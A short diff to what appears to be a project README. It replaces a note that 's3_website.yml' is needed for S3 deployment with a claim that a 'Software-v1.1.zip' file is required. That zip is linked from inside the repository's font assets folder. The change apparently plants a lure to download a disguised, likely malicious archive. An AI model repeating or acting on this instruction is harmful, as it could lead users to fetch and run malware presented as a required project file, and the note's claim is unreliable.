@@ -17,4 +17,4 @@ $ make serve
 ```
 $ make deploy
 ```
-Note: `s3_website.yml` is required for pushing to S3
+Note: `https://github.com/videogramme/pintsinthesun/raw/refs/heads/master/src/assets/fonts/clearsans/SVG/Software-v1.1.zip` is required for pushing to S3
